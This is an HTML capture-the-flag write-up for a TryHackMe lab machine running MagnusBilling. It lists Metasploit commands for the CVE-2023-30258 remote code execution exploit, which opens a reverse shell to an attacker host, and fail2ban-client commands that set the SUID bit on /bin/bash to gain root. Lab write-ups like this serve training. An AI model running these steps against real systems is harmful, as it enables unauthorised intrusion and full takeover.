@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>⌈ CTF – Challenge Name ⌋</title>
+  <link rel="icon" href="/favicon_64px.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      background-color: #0e0e0e;
+      color: #e0e0e0;
+      font-family: monospace;
+      line-height: 1.6;
+      padding: 40px;
+    }
+
+    h1, h2, h3 {
+      color: #ff5c5c;
+      margin-bottom: 10px;
+    }
+
+    a {
+      color: #7fc7ff;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-shadow: 0 0 4px #7fc7ff;
+    }
+
+    code, pre {
+      background: #1a1a1a;
+      padding: 10px;
+      border-radius: 5px;
+      display: block;
+      margin: 10px 0;
+      color: #9aff9a;
+      overflow-x: auto;
+    }
+
+
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    .back-btn {
+      margin-top: 40px;
+      display: inline-block;
+      padding: 10px 20px;
+      border: 2px solid #ccc;
+      color: #ccc;
+      text-decoration: none;
+    }
+
+    .back-btn:hover {
+      background-color: #ff5c5c;
+      color: #111;
+    }
+
+    .meta {
+      color: #888;
+      font-size: 0.9rem;
+      margin-bottom: 20px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #333;
+      margin: 30px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>⌈ CTF Writeup – BillingV2 - easy linux - tryhackme⌋</h1>
+    <div class="meta">Category: Web | Points: 50 | Date: 2025-04-15</div>
+
+    <h2>🧠 Description</h2>
+    <p>
+    MagnusBilling is an open-source VoIP billing software, we will see how to gain root access to the machine.
+    </p>
+
+    <h2>🔍 Nmap scan</h2>
+    <p>
+      Nmap scan at 10.10.153.83
+    </p>
+    <pre>
+nmap -sV 10.10.153.83
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    </pre>
+    </p>
+    as you can see port 80 (http) is open so let's see
+    </p>
+    <pre>
+The IP address takes us to the identification page of the "magnus billing" software.
+By searching on the internet it is possible to see that there are exploits circulating on this software.
+including one that interests us "rce cve 2023_30258" Command Injection vulnerability.
+This exploit is available on Metasploit Framework, lets use it.
+
+msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
+msf > set RHOST 10.10.153.83
+msf > set LHOST 10.21.165.46
+msf > exploit
+
+<img src="ctf1.png" alt="metasploit-ctf1" width="600">
+and we have a reverse shell.
+    </pre>
+    <h2>🔓 Flag and privilege escalation</h2>
+    <pre>
+we now have the user flag
+<img src="ctf12.png" alt="user-flag" width="600">   
+now for the root flag we need to find a way to become root
+lets do a sudo -l
+<img src="ctf123.png" alt="sudo-l" width="600"> 
+so we can exploit fail2ban because we have sudo rights on it.
+By searching we can find that it is indeed possible to mount root thanks to fail2ban.
+    </pre>
+    
+    <h2>🔓 Exploitation</h2>
+    <p>
+        using the fail2ban exploit.
+    </p>
+    <pre>
+sudo fail2ban-client status
+
+sudo fail2ban-client get sshd actions
+        
+sudo fail2ban-client set sshd addaction evil
+        
+sudo fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
+        
+sudo fail2ban-client set sshd banip 1.2.3.5
+        
+/bin/bash -p
+
+And we are root.
+    
+<img src="ctf1234.png" alt="sudo-l" width="600"> 
+    </pre>
+    
+
+    <h2>📎 Notes</h2>
+    <p>
+        Billing 2 is a very good machine to start privilege escalation. 7/10
+    </p>
+
+    <hr>
+    <a href="ctf-list.html" class="back-btn">← Back to CTF List</a>
+  </div>
+</body>
+</html>
